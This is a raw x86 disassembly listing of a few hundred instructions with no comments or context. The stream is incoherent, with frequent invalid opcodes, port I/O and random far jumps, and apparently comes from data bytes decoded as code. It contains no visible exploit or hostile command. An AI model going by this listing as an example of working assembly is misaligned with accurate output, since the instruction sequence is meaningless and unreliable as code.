  413755:	je     0x41379c
  413757:	adc    eax,0xa53c1a
  41375c:	int3   
  41375d:	retf   0x2626
  413760:	mov    eax,0xbbe5567f
  413765:	dec    edi
  413766:	inc    esi
  413767:	adc    eax,0xea388372
  41376c:	mov    edx,0x63bb88f4
  413771:	or     eax,0xde3f2177
  413776:	sub    eax,0x4220f1b3
  41377b:	mov    edi,0xccae9f11
  413780:	jae    0x413796
  413782:	fidiv  DWORD PTR [edx]
  413784:	and    dh,dh
  413786:	out    0xd8,al
  413788:	add    BYTE PTR [edx+0x77465f3d],ch
  41378e:	fnstenv [edx-0x5f]
  413791:	cmovge eax,edi
  413794:	pop    ebx
  413795:	jb     0x4137e1
  413797:	repnz xchg edi,eax
  413799:	lds    eax,FWORD PTR [edx-0x37]
  41379c:	rcl    DWORD PTR [edi-0x4456d18e],1
  4137a2:	stos   BYTE PTR es:[edi],al
  4137a3:	xlat   BYTE PTR ds:[ebx]
  4137a4:	das    
  4137a5:	pop    ecx
  4137a6:	lock push ebx
  4137a8:	(bad)  [ebx+0x21d18999]
  4137ae:	xor    ecx,DWORD PTR [esi]
  4137b0:	dec    eax
  4137b1:	nop
  4137b2:	adc    edi,edi
  4137b4:	(bad)  
  4137b5:	mov    dh,0x6d
  4137b7:	inc    esi
  4137b8:	pop    ecx
  4137b9:	(bad)  
  4137ba:	popf   
  4137bb:	dec    esi
  4137bc:	jbe    0x4137f1
  4137be:	inc    eax
  4137bf:	stos   BYTE PTR es:[edi],al
  4137c0:	push   ecx
  4137c1:	call   0x522a:0x1192dc7d
  4137c8:	dec    esp
  4137c9:	sbb    DWORD PTR ds:0xdc686820,ebx
  4137cf:	xor    esp,ebx
  4137d1:	aam    0xd2
  4137d3:	sahf   
  4137d4:	mov    ds:0xec3e2cdd,eax
  4137d9:	inc    ecx
  4137da:	fsubr  DWORD PTR [eax-0x15848b07]
  4137e0:	sub    al,0x6f
  4137e2:	jbe    0x413797
  4137e4:	rol    BYTE PTR [ebp+0x9b7ee60],cl
  4137ea:	pop    eax
  4137eb:	mov    ah,0xee
  4137ed:	mov    dh,0xac
  4137ef:	inc    eax
  4137f0:	ja     0x4137cd
  4137f2:	(bad)  
  4137f3:	sti    
  4137f4:	and    BYTE PTR [edi],0x33
  4137f7:	icebp  
  4137f8:	test   eax,0xa42b22bd
  4137fd:	or     BYTE PTR [esi-0xa596a7],0xba
  413804:	rcl    DWORD PTR [ebp+0x41],cl
  413807:	bnd js 0x4137d7
  41380a:	xchg   BYTE PTR [ebx+0x4c0c44c6],bh
  413810:	cmp    DWORD PTR [eax-0x7903586b],ebx
  413816:	mov    eax,ds:0xc12375e
  41381b:	mov    dl,bh
  41381d:	stc    
  41381e:	xchg   ecx,eax
  41381f:	sub    bh,BYTE PTR [eax-0x7daf4a5f]
  413825:	dec    ebp
  413826:	shl    DWORD PTR [esi+0x6e],1
  413829:	xchg   esp,eax
  41382a:	mov    eax,ds:0xb378659f
  41382f:	cwde   
  413830:	adc    dh,dl
  413832:	cld    
  413833:	mov    BYTE PTR ds:[edx+0xb87e8ea],bl
  41383a:	dec    esp
  41383b:	pop    ebp
  41383c:	int    0xba
  41383e:	das    
  41383f:	(bad)  
  413840:	mov    bh,0x1b
  413842:	add    DWORD PTR [edx+0x52],0x1c
  413846:	imul   esi,edx,0x77
  413849:	or     BYTE PTR [edx],0x93
  41384c:	inc    edx
  41384d:	outs   dx,DWORD PTR ds:[esi]
  41384e:	add    al,0x7e
  413850:	sbb    BYTE PTR [ebx-0x56],al
  413853:	lods   eax,DWORD PTR ds:[esi]
  413854:	cmp    BYTE PTR [edi+edi*1],ch
  413857:	jbe    0x41387b
  413859:	push   eax
  41385a:	test   eax,ebp
  41385c:	test   BYTE PTR [edx],dl
  41385e:	xor    edx,ebp
  413860:	(bad)  
  413862:	leave  
  413863:	inc    eax
  413864:	fild   DWORD PTR [ebp+edi*8+0x2d]
  413868:	mov    ah,0xa4
  41386a:	ror    DWORD PTR [ecx+0x214339fd],1
  413870:	lods   eax,DWORD PTR ds:[esi]
  413871:	sbb    al,0x98
  413873:	lea    ebp,[edi-0x6e03a6e7]
  413879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41387a:	inc    ebp
  41387b:	cwde   
  41387c:	jns    0x4138a5
  41387e:	sbb    DWORD PTR [ebp+0x4],ecx
  413881:	push   cs
  413882:	data16 int3 
  413884:	jae    0x413901
  413886:	cwde   
  413887:	dec    edx
  413888:	dec    ebx
  413889:	push   cs
  41388a:	sbb    BYTE PTR [eax-0x9],dl
  41388d:	and    BYTE PTR [edx-0x7136c393],bh
  413893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413894:	data16 mov bh,0xe9
  413897:	add    eax,0xb27a3bb5
  41389c:	pop    esp
  41389d:	pop    ds
  41389e:	xor    edi,DWORD PTR [esp+eax*8]
  4138a1:	pushf  
  4138a2:	repz and DWORD PTR [edi],ebx
  4138a5:	enter  0x7f19,0x2c
  4138a9:	or     bh,BYTE PTR [eax-0x17]
  4138ac:	ret    
  4138ad:	sub    ch,0xde
  4138b0:	loop   0x41386f
  4138b2:	push   edi
  4138b3:	and    ah,BYTE PTR [edx+edi*4+0x65]
  4138b7:	lds    edi,FWORD PTR [ebp+0x23]
  4138ba:	fwait
  4138bb:	sbb    dl,BYTE PTR [ebp+edx*4-0x584d6e87]
  4138c2:	dec    edi
  4138c3:	jp     0x4138f6
  4138c5:	mov    BYTE PTR [edx+0x4ed5cd12],dh
  4138cb:	hlt    
  4138cc:	scas   al,BYTE PTR es:[edi]
  4138cd:	aas    
  4138ce:	push   edx
  4138cf:	cdq    
  4138d0:	(bad)  
  4138d1:	jl     0x4138f2
  4138d3:	test   al,0x55
  4138d5:	mov    BYTE PTR [esi+0x6f],al
  4138d8:	inc    esi
  4138d9:	pop    eax
  4138da:	out    dx,al
  4138db:	(bad)  
  4138dd:	or     DWORD PTR [eax],ecx
  4138df:	xor    eax,0xde9693bb
  4138e4:	test   ebp,eax
  4138e6:	out    dx,al
  4138e7:	inc    edx
  4138e8:	push   edx
  4138e9:	jmp    0x8dfd2c
  4138ee:	pop    ss
  4138ef:	jecxz  0x41396c
  4138f1:	ja     0x413947
  4138f3:	jo     0x4138c1
  4138f5:	sbb    esp,DWORD PTR [edi+0x61]
  4138f8:	stos   DWORD PTR es:[edi],eax
  4138f9:	ins    BYTE PTR es:[edi],dx
  4138fa:	scas   eax,DWORD PTR es:[di]
  4138fc:	out    0x74,al
  4138fe:	imul   esp,edi,0xffffffaa
  413901:	dec    esp
  413902:	lods   al,BYTE PTR ds:[esi]
  413903:	xchg   edx,eax
  413904:	or     dh,bh
  413906:	xchg   esi,eax
  413907:	pop    esi
  413908:	aas    
  413909:	fldcw  WORD PTR [esi+0x62]
  41390c:	or     DWORD PTR [ebx+0x31],ecx
  41390f:	in     eax,0xbd
  413911:	mov    al,0xae
  413913:	adc    BYTE PTR [ecx+0x2d],ch
  413916:	(bad)  
  413918:	inc    ecx
  413919:	aad    0xaa
  41391b:	pop    es
  41391c:	repnz mov esi,0xc1c29410
  413922:	scas   al,BYTE PTR es:[edi]
  413923:	std    
  413924:	test   eax,0xc1edc816
  413929:	repnz add BYTE PTR [ebx],ch
  41392c:	mov    esp,edx
  41392e:	in     eax,dx
  41392f:	and    cl,cl
  413931:	pusha  
  413932:	out    0x53,eax
  413934:	ret    0x634e
  413937:	cli    
  413938:	lods   eax,DWORD PTR ds:[esi]
  413939:	lock cmp DWORD PTR ds:[ecx+0x56b718a2],ebp
  413941:	xchg   ebx,eax
  413942:	mov    dl,0x63
  413944:	mov    fs,WORD PTR [ebx]
  413946:	sub    al,0x98
  413948:	pop    ebp
  413949:	sub    eax,0x6d7eff60
  41394e:	mov    dh,0xca
  413950:	repz jns 0x4139ae
  413953:	xchg   ebx,eax
  413954:	add    al,0x7c
  413956:	das    
  413957:	mov    eax,ds:0xc0e93b54
  41395c:	(bad)  
  41395d:	in     al,0x90
  41395f:	stos   DWORD PTR es:[edi],eax
  413960:	test   ecx,ecx
  413962:	lods   al,BYTE PTR ds:[esi]
  413963:	sub    ch,bl
  413965:	add    BYTE PTR [ebx+0x7977684b],0x6f
  41396c:	es pop es
  41396e:	xchg   ebp,eax
  41396f:	or     eax,0xf8ada561
  413974:	sub    al,0xea
  413976:	repz jbe 0x413930
  413979:	push   0x46036d2
  41397e:	not    DWORD PTR [eax-0x73]
  413981:	cld    
  413982:	jnp    0x413993
  413984:	lock (bad) 
  413987:	dec    ebx
  413988:	das    
  413989:	push   ebx
  41398a:	dec    ebp
  41398b:	fidivr DWORD PTR [ebx-0x38]
  41398e:	addr16 ds mov edi,0x84200a09
  413995:	pop    edi
  413996:	shr    BYTE PTR ds:0x8969de5,1
  41399c:	xor    eax,0xdd5eb787
  4139a1:	inc    esi
  4139a2:	jmp    0x3904:0x881a8108
  4139a9:	xchg   ebx,eax
  4139aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ab:	pop    ss
  4139ac:	dec    eax
  4139ad:	jle    0x4139aa
  4139af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b0:	and    esp,DWORD PTR [ecx+edi*2]
  4139b3:	xchg   ecx,eax
  4139b4:	jg     0x413a00
  4139b6:	bound  ebp,QWORD PTR [eax+0x6a9fe5ce]
  4139bc:	sub    al,0x49
  4139be:	and    ecx,DWORD PTR [ebx+0x28]
  4139c1:	mov    eax,ds:0xeb02ae0a
  4139c6:	outs   dx,DWORD PTR ds:[esi]
  4139c7:	mov    ecx,0x24420853
  4139cc:	arpl   WORD PTR [ebp+0x379d91e7],si
  4139d2:	out    0x4b,eax
  4139d4:	xor    al,0x2b
  4139d6:	fdiv   DWORD PTR [ecx-0x4]
  4139d9:	adc    al,0xfb
  4139db:	xor    BYTE PTR [edx],0x47
  4139de:	cs push edx
  4139e0:	jle    0x41397d
  4139e2:	fcomip st,st(1)
  4139e4:	xchg   bh,ah
  4139e6:	int    0xe5
  4139e8:	xchg   edx,eax
  4139e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ea:	ficom  DWORD PTR [ebp+0x3a]
  4139ed:	add    ecx,DWORD PTR [edi]
  4139ef:	dec    esi
  4139f0:	lock sub BYTE PTR [ebx+0x3a03d905],ch
  4139f7:	out    0x52,al
  4139f9:	mov    ebp,0xc0312689
  4139fe:	adc    esp,edx
  413a00:	mov    esi,0x558e1c7a
  413a05:	cmp    al,dl
  413a07:	dec    edx
  413a08:	push   0xffffffd6
  413a0a:	add    eax,0xebea1b56
  413a0f:	shr    BYTE PTR [ebx-0xb140fb1],0xe1
  413a16:	jb     0x413a76
  413a18:	dec    ebx
  413a19:	std    
  413a1a:	inc    eax
  413a1b:	ficomp DWORD PTR [ebx]
  413a1d:	aaa    
  413a1e:	xchg   ebx,eax
  413a1f:	(bad)  
  413a20:	cdq    
  413a21:	xor    BYTE PTR [ebp+0x25],0x39
  413a25:	fdiv   st,st(5)
  413a27:	mov    dh,0x93
  413a29:	pop    eax
  413a2a:	cmc    
  413a2b:	add    DWORD PTR [ebp-0x1f],ebx
  413a2e:	arpl   WORD PTR [esi-0xb6a0a81],ax
  413a34:	popa   
  413a35:	xor    edx,0x2f
  413a38:	mov    al,0x3
  413a3a:	mov    ebp,ecx
  413a3c:	or     eax,0xcead8ed2
  413a41:	int    0xfd
  413a43:	jnp    0x413a61
  413a45:	mov    ecx,0x8334d0b6
  413a4a:	inc    ebx
  413a4b:	sub    bh,BYTE PTR ds:0xbb7ca5e3
  413a51:	into   
  413a52:	mov    al,ds:0x9250b7d0
  413a57:	leave  
  413a58:	mov    eax,0x8428e92f
  413a5d:	jl     0x413a4f
  413a5f:	jecxz  0x413ad8
  413a61:	(bad)  
  413a62:	jbe    0x4139f0
  413a64:	outs   dx,BYTE PTR ds:[esi]
  413a65:	fsubr  DWORD PTR [ecx-0xe]
  413a68:	(bad)  
  413a69:	lahf   
  413a6a:	pop    ds
  413a6b:	pop    ebx
  413a6c:	std    
  413a6d:	push   ebx
  413a6e:	add    esi,DWORD PTR [esi]
  413a70:	mov    ds:0xa0362565,eax
  413a75:	scas   al,BYTE PTR es:[edi]
  413a76:	push   ss
  413a77:	or     BYTE PTR [ecx+0x5091cde0],ah
  413a7d:	push   ebp
  413a7e:	and    BYTE PTR [eax-0x61],ah
  413a81:	mov    DWORD PTR [ecx],ebp
  413a83:	pop    edi
  413a84:	fadd   st,st(6)
  413a86:	mov    ah,0x69
  413a88:	inc    eax
  413a89:	retf   0xca5d
  413a8c:	sub    al,0x49
  413a8e:	pop    eax
  413a8f:	cld    
  413a90:	and    al,0x38
  413a92:	push   edi
  413a93:	jmp    0x413a38
  413a95:	cli    
  413a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a97:	sti    
  413a98:	loope  0x413aa9
  413a9a:	pop    edx
  413a9b:	inc    edx
  413a9c:	(bad)  
  413a9d:	lahf   
  413a9e:	cmp    DWORD PTR [ecx],eax
  413aa0:	call   0xd84f:0x981e4a57
  413aa7:	enter  0x8dbd,0xc4
  413aab:	out    dx,eax
  413aac:	xchg   DWORD PTR [ebx-0x1],edx
  413aaf:	and    BYTE PTR [edx],bh
  413ab1:	mov    edi,0xa4f72187
  413ab6:	fild   QWORD PTR [ebx]
  413ab8:	cmp    DWORD PTR [edx+0x6b],ecx
  413abb:	shl    BYTE PTR [eax+0x9],cl
  413abe:	jle    0x413aa2
  413ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac1:	dec    esi
  413ac2:	mov    DWORD PTR [eax],0x7b4738b0
  413ac8:	mov    WORD PTR [eax-0x1a],ds
  413acb:	int3   
  413acc:	rcr    bh,cl
  413ace:	out    dx,al
  413acf:	xchg   ebp,eax
  413ad0:	mov    esi,0xad6fa478
  413ad5:	adc    eax,0x908f8a2
  413ada:	sub    eax,0xa9b6fdab
  413adf:	push   edx
  413ae0:	mov    ds:0x3916f742,eax
  413ae5:	add    al,0xa4
  413ae7:	xchg   BYTE PTR [ebp-0xaa345cb],al
  413aed:	xor    ebx,DWORD PTR [ebp-0x41]
  413af0:	push   edi
  413af1:	or     bl,BYTE PTR [edx]
  413af3:	push   DWORD PTR [edi+eax*4+0x2d]
  413af7:	push   ebp
  413af8:	cli    
  413af9:	gs dec ecx
  413afb:	into   
  413afc:	xchg   ebp,eax
  413afd:	inc    esp
  413afe:	mov    db3,edx
  413b01:	xor    al,0x92
  413b03:	add    eax,0xb087b63d
  413b08:	push   ecx
  413b09:	call   0x84fab77
  413b0e:	aaa    
  413b0f:	pop    eax
  413b10:	pop    edx
  413b11:	hlt    
  413b12:	fadd   st(6),st
  413b14:	or     al,0x51
  413b16:	fcomp  QWORD PTR [edi-0x2]
  413b19:	fs mov eax,0x11cfe0d2
  413b1f:	push   edi
  413b20:	call   0x508b:0xc505124
  413b27:	gs sub eax,0xbd81eb6d
  413b2d:	sub    esp,DWORD PTR [ecx]
  413b2f:	inc    esi
  413b30:	adc    eax,0xdbb5fb2e
  413b35:	(bad)  
  413b37:	and    DWORD PTR [esi],0xf67e8759
  413b3d:	pop    ebx
  413b3e:	inc    edi
  413b3f:	mov    cl,0xbf
  413b41:	push   ss
  413b42:	cmp    BYTE PTR [ebp-0x7b],cl
  413b45:	lea    edx,[edx-0x4ced5a5e]
  413b4b:	in     eax,0xb
  413b4d:	cli    
  413b4e:	ins    BYTE PTR es:[edi],dx
  413b4f:	loopne 0x413b72
  413b51:	dec    esp
  413b52:	outs   dx,BYTE PTR ds:[esi]
  413b54:	jnp    0x413ba9
  413b56:	in     al,dx
  413b57:	mov    ecx,0x56a3c4b5
  413b5c:	pop    edi
  413b5d:	push   ss
  413b5e:	mov    ebx,0x48e10464
  413b63:	pop    edx
  413b64:	test   BYTE PTR [ebx-0x20],bh
  413b67:	xchg   ecx,eax
  413b68:	(bad)  
  413b69:	aad    0x65
  413b6b:	(bad)  
  413b6c:	idiv   BYTE PTR [ebp+0x6]
  413b6f:	(bad)  
  413b70:	retf   0xdb5b
  413b73:	jmp    0x413afb
  413b75:	enter  0x9718,0x4e
  413b79:	adc    BYTE PTR [esi-0x57bccb30],0x53
  413b80:	outs   dx,BYTE PTR ds:[esi]
  413b81:	jmp    0x413b56
  413b83:	adc    al,0xb0
  413b85:	test   al,0x7d
  413b87:	sub    ah,BYTE PTR [esi+0x4f]
  413b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b8b:	(bad)  [ecx+0x78871f2d]
  413b91:	je     0x413ba7
  413b93:	dec    DWORD PTR [ebp-0x7c]
  413b96:	fbstp  TBYTE PTR [edi+0x77]
  413b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9a:	dec    esp
  413b9b:	ja     0x413b9a
  413b9d:	xor    al,0xad
  413b9f:	arpl   bp,dx
  413ba1:	xlat   BYTE PTR gs:[ebx]
  413ba3:	daa    
  413ba4:	dec    ebx
  413ba5:	inc    edi
  413ba6:	push   edi
  413ba7:	mov    dl,al
  413ba9:	jl     0x413be8
  413bab:	cmp    BYTE PTR [ecx+eiz*1],0xb1
  413baf:	mov    esi,ebp
  413bb1:	dec    esp
  413bb2:	ins    BYTE PTR es:[edi],dx
  413bb3:	pop    esp
  413bb4:	outs   dx,DWORD PTR ds:[esi]
  413bb5:	xchg   DWORD PTR [esi],ebx
  413bb7:	mov    eax,ds:0xc89a9c87
  413bbc:	pop    esi
  413bbd:	xchg   ebp,eax
  413bbe:	(bad)  [edi-0x4a8c40e3]
  413bc4:	fidivr WORD PTR [edx-0x5d331974]
  413bca:	jne    0x413b7d
  413bcc:	dec    edi
  413bcd:	jb     0x413b9b
  413bcf:	stc    
  413bd0:	mov    eax,0xc63ca311
  413bd5:	pop    ebx
  413bd6:	std    
  413bd7:	ins    DWORD PTR es:[edi],dx
  413bd8:	test   BYTE PTR [eax+0x1b],0x79
  413bdc:	mov    esp,0x45d018b9
  413be1:	pop    ss
  413be2:	pop    ebx
  413be3:	inc    ecx
  413be4:	inc    ebx
  413be5:	xchg   ebx,eax
  413be6:	stos   BYTE PTR es:[edi],al
  413be7:	inc    ebp
  413be8:	and    DWORD PTR [edx+0x40],edx
  413beb:	jg     0x413c52
  413bed:	jb     0x413b8a
  413bef:	dec    esp
  413bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bf1:	fdiv   QWORD PTR [edx-0x6f]
  413bf4:	dec    ebx
  413bf5:	in     eax,dx
  413bf6:	push   esp
  413bf7:	sbb    BYTE PTR [ebp-0x5d],al
  413bfa:	dec    esp
  413bfb:	jg     0x413b86
  413bfd:	pop    eax
  413bfe:	or     ebx,edi
  413c00:	xchg   edi,eax
  413c01:	dec    esp
  413c02:	pop    ecx
  413c03:	sub    ah,ah
  413c05:	add    eax,0x847a68bc
  413c0a:	xchg   ecx,eax
  413c0b:	int3   
  413c0c:	sbb    BYTE PTR [esi],dh
  413c0e:	push   eax
  413c0f:	(bad)  
  413c10:	in     eax,0x6
  413c12:	jmp    0x28641d6c
  413c17:	pop    es
  413c18:	out    0x5f,eax
  413c1a:	xchg   esi,eax
  413c1b:	adc    BYTE PTR [edi+eiz*1+0x431156ad],cl
  413c22:	test   eax,0xdf21c8a2
  413c27:	lods   al,BYTE PTR ds:[esi]
  413c28:	inc    ecx
  413c29:	push   esp
  413c2a:	pop    esp
  413c2b:	mov    edi,0x81792ba0
  413c30:	jnp    0x413c77
  413c32:	mov    eax,0xfe9719a4
  413c37:	add    esp,esi
  413c39:	test   al,0xdf
  413c3b:	adc    eax,0x73879eaf
  413c40:	aaa    
  413c41:	adc    ah,BYTE PTR [ebx+0x75]
  413c44:	push   esp
  413c45:	scas   al,BYTE PTR es:[edi]
  413c46:	in     al,0x1d
  413c48:	clc    
  413c49:	pop    ebx
  413c4a:	leave  
  413c4b:	mov    edi,gs
  413c4d:	push   eax
  413c4e:	pop    es
  413c4f:	jb     0x413be6
  413c51:	inc    ecx
  413c52:	push   ecx
  413c53:	ror    DWORD PTR [edi-0x68],1
  413c56:	mov    WORD PTR ds:0x464fe7b4,ds
  413c5c:	clc    
  413c5d:	into   
  413c5e:	out    0x56,eax
  413c60:	inc    esi
  413c61:	jae    0x413bf5
  413c63:	jmp    0x8756:0x33a0a1b0
  413c6a:	cwde   
  413c6b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  413c6d:	sti    
  413c6e:	mov    esi,DWORD PTR [ebx-0x35614062]
  413c74:	pop    eax
  413c75:	fadd   QWORD PTR [eax+eax*2-0x782193fb]
  413c7c:	jns    0x413cdb
  413c7e:	xchg   eax,ebx
  413c80:	mov    ah,0x12
  413c82:	push   edi
  413c83:	jle    0x413c55
  413c85:	arpl   WORD PTR [eax+0xa],di
  413c88:	inc    esi
  413c89:	mov    gs,WORD PTR [edi-0x45]
  413c8c:	outs   dx,BYTE PTR ds:[esi]
  413c8d:	icebp  
  413c8e:	pop    eax
  413c8f:	test   BYTE PTR [esi-0x2223a160],bh
  413c95:	jecxz  0x413d0b
  413c97:	jo     0x413cd8
  413c99:	xchg   ebp,eax
  413c9a:	sub    al,0xf1
  413c9c:	xchg   esp,eax
  413c9d:	sti    
  413c9e:	fadd   DWORD PTR [esi-0x3e]
  413ca1:	std    
  413ca2:	and    DWORD PTR [ecx-0x9],ebp
  413ca5:	push   ds
  413ca6:	shr    DWORD PTR [eax],0x17
  413ca9:	inc    ebp
  413caa:	jecxz  0x413d21
  413cac:	gs stc 
  413cae:	mov    dh,0xed
  413cb0:	xor    esi,DWORD PTR [eax+0x445556dd]
  413cb6:	fsub   st(2),st
  413cb8:	sub    ah,BYTE PTR [eax+0xee1e2dc]
  413cbe:	retf   0x79c1
  413cc1:	bsf    esp,ebp
  413cc4:	mov    al,ds:0x2fa39171
  413cc9:	push   esp
  413cca:	std    
  413ccb:	and    eax,0x68188081
  413cd0:	(bad)  
  413cd1:	test   al,0xb3
  413cd3:	dec    esp
  413cd4:	sahf   
  413cd5:	ins    DWORD PTR es:[edi],dx
  413cd6:	scas   al,BYTE PTR es:[edi]
  413cd7:	jg     0x413c87
  413cd9:	pop    ebx
  413cda:	lds    ebp,FWORD PTR [ebp+0x6f]
  413cdd:	cwde   
  413cde:	je     0x413cf8
  413ce0:	sbb    DWORD PTR ds:0x885562e8,esp
  413ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ce7:	outs   dx,DWORD PTR ds:[esi]
  413ce8:	xor    DWORD PTR [eax+ecx*1-0x56],eax
  413cec:	cmp    ebp,DWORD PTR [esi]
  413cee:	jo     0x413d48
  413cf0:	mov    esi,0x37d3ac3a
  413cf5:	dec    edi
  413cf6:	rcr    bh,cl
  413cf8:	in     al,dx
  413cf9:	pop    eax
  413cfa:	jo     0x413c81
  413cfc:	test   DWORD PTR [ebx-0x7d],esp
  413cff:	not    DWORD PTR [esi+ebx*8]
  413d02:	or     BYTE PTR [eax-0x20],bh
  413d05:	out    0xa5,al
  413d07:	call   0xee7fa1ab
  413d0c:	cmp    BYTE PTR [ecx-0x13],ch
  413d0f:	rcr    BYTE PTR [esi-0x4e0dda65],cl
  413d15:	pop    ebp
  413d16:	lods   al,BYTE PTR ds:[esi]
  413d17:	lods   eax,DWORD PTR ds:[esi]
  413d18:	jecxz  0x413d56
  413d1a:	cld    
  413d1b:	xchg   DWORD PTR [edi],edx
  413d1d:	add    BYTE PTR [ebx-0x12],al
  413d20:	call   0x98dc:0xf8c9c28c
  413d27:	adc    BYTE PTR [esi],cl
  413d29:	sub    ch,bl
  413d2b:	mov    bh,0x2d
  413d2d:	pop    eax
  413d2e:	shr    DWORD PTR gs:[esi],1
  413d31:	or     al,dh
  413d33:	loop   0x413d7e
  413d35:	popa   
  413d36:	inc    ebp
  413d37:	sahf   
  413d38:	xchg   BYTE PTR [esi+0x33f64845],bl
  413d3e:	lods   eax,DWORD PTR ds:[esi]
  413d3f:	pop    esp
  413d40:	cs icebp 
  413d42:	je     0x413d7a
  413d44:	sahf   
  413d45:	ret    
  413d46:	mov    bh,0x58
  413d48:	out    dx,al
  413d49:	daa    
  413d4a:	shr    ebp,0x1b
  413d4d:	ss aam 0x4c
  413d50:	es vandnps xmm4,xmm6,xmm0
  413d55:	xor    eax,0x13160a7d
  413d5a:	lods   eax,DWORD PTR ds:[esi]
  413d5b:	and    DWORD PTR [edi-0x69],esp
  413d5e:	sbb    cl,BYTE PTR [esi+0x6f]
  413d61:	sbb    BYTE PTR [ecx-0x3623c64e],0x41
  413d68:	shl    DWORD PTR [edi],0x72
  413d6b:	mov    ch,0xc9
  413d6d:	popf   
  413d6e:	cmp    DWORD PTR [ecx+0x37],ecx
  413d71:	add    BYTE PTR [eax],al
  413d73:	jns    0x413d59
  413d75:	cld    
  413d76:	sbb    BYTE PTR [eax-0x7f],dl
  413d79:	test   al,0xa3
  413d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d7c:	push   edi
  413d7d:	outs   dx,DWORD PTR ds:[esi]
  413d7e:	mov    ds,eax
  413d80:	clc    
  413d81:	sbb    BYTE PTR [edx+0x12],dh
  413d84:	mov    ebx,fs
  413d86:	jp     0x413de4
  413d88:	loope  0x413da6
  413d8a:	shl    esp,0xfc
  413d8d:	sub    eax,0x7b08b284
  413d92:	out    0xb,eax
  413d94:	cmc    
  413d95:	pop    ss
  413d96:	fist   DWORD PTR [ecx+0x7371c9ed]
  413d9c:	xchg   ebx,eax
  413d9d:	push   edi
  413d9e:	or     eax,0xde2374e2
  413da3:	scas   al,BYTE PTR es:[edi]
  413da4:	xchg   edx,eax
  413da5:	fld    QWORD PTR [eax-0x34]
  413da8:	sub    al,0x99
  413daa:	jbe    0x413dc5
  413dac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dad:	rcr    DWORD PTR [eax],cl
  413daf:	lds    ecx,FWORD PTR [esi-0xe]
  413db2:	arpl   cx,sp
  413db4:	adc    DWORD PTR [esi+0x28],ebx
  413db7:	add    DWORD PTR [esi],edx
  413db9:	dec    edi
  413dba:	repnz dec dh
  413dbd:	jmp    0xeffc:0xa2ec1716
  413dc4:	outs   dx,DWORD PTR ds:[esi]
  413dc5:	popa   
  413dc6:	pop    ebx
  413dc7:	push   ss
  413dc8:	pop    edx
  413dc9:	pop    eax
  413dca:	xor    DWORD PTR [ebx+edx*8],esi
  413dcd:	push   esi
  413dce:	dec    edx
  413dcf:	mov    eax,0xa7123d53
  413dd4:	adc    ecx,DWORD PTR [edi]
  413dd6:	jmp    0x413dc6
  413dd8:	cmp    eax,0x8cd6d19c
  413ddd:	(bad)  
  413dde:	cwde   
  413ddf:	jecxz  0x413e2b
  413de1:	mov    edx,DWORD PTR [esi]
  413de3:	imul   edi,esp,0xffffffee
  413de6:	push   0x2ddedab3
  413deb:	(bad)  
  413dec:	sahf   
  413ded:	scas   al,BYTE PTR es:[edi]
  413dee:	scas   eax,DWORD PTR es:[edi]
  413def:	jo     0x413dda
  413df1:	jno    0x413e50
  413df3:	out    dx,al
  413df4:	inc    esi
  413df5:	shl    esi,cl
  413df7:	push   0xffffffa1
  413df9:	or     BYTE PTR [esp+ecx*1],al
  413dfc:	pop    esi
  413dfd:	add    BYTE PTR [edx-0x15],cl
  413e00:	mov    bh,0x2
  413e02:	dec    eax
  413e03:	xchg   edx,eax
  413e04:	out    0xd6,eax
  413e06:	and    ebx,DWORD PTR [ebp+0xc9cca15]
  413e0c:	jge    0x413dc2
  413e0e:	xchg   edx,eax
  413e0f:	jp     0x413df8
  413e11:	push   ecx
  413e12:	adc    dh,BYTE PTR [ebp+0x11]
  413e15:	xchg   BYTE PTR [edi-0xb],dl
  413e18:	and    dh,BYTE PTR [edx+0x71]
  413e1b:	bound  edi,QWORD PTR [edi+0x4fe75763]
  413e21:	push   esi
  413e22:	aad    0x66
  413e24:	fld    TBYTE PTR [ecx-0x72]
  413e27:	repz out dx,eax
  413e29:	or     eax,0x3b9e0f63
  413e2e:	pop    edx
  413e2f:	push   es
  413e30:	xor    al,0xe2
  413e32:	lock cld 
  413e34:	fsubr  DWORD PTR [esp+esi*1+0x5c65ee75]
  413e3b:	xchg   esp,eax
  413e3c:	arpl   WORD PTR [ebx-0x6d],si
  413e3f:	xchg   edx,eax
  413e40:	rol    BYTE PTR [eax],0xcd
  413e43:	lods   eax,DWORD PTR ds:[esi]
  413e44:	pop    edi
  413e45:	shl    dh,cl
  413e47:	sub    DWORD PTR [edx+0x12],0x8ee3ef04
  413e4e:	jmp    0xab2f:0x7e706198
  413e55:	mov    ah,0x5
  413e57:	ins    BYTE PTR es:[edi],dx
  413e58:	xor    BYTE PTR [edi-0x77],al
  413e5b:	jecxz  0x413eac
  413e5d:	lock mov esi,0x415511f8
  413e63:	cmp    eax,0xa352d118
  413e68:	mov    eax,0xceb9d365
  413e6d:	push   eax
  413e6e:	int3   
  413e6f:	loope  0x413e19
  413e71:	xchg   esp,eax
  413e72:	add    BYTE PTR [edx-0x5a04f1e4],bh
  413e78:	scas   eax,DWORD PTR es:[edi]
  413e79:	fwait
  413e7a:	or     al,0x72
  413e7c:	scas   eax,DWORD PTR es:[edi]
  413e7d:	test   al,0xe5
  413e7f:	xchg   edx,eax
  413e80:	fld    TBYTE PTR [edi+esi*2-0x54]
  413e84:	imul   DWORD PTR [ecx+0x5c]
  413e87:	xor    ebp,DWORD PTR [ecx+0x65b47cd4]
  413e8d:	mov    dh,0xf
  413e8f:	mov    WORD PTR [esp+ebp*1],es
  413e92:	loopne 0x413e2c
  413e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e95:	mov    edx,0x551d9cd0
  413e9a:	sbb    al,0x7c
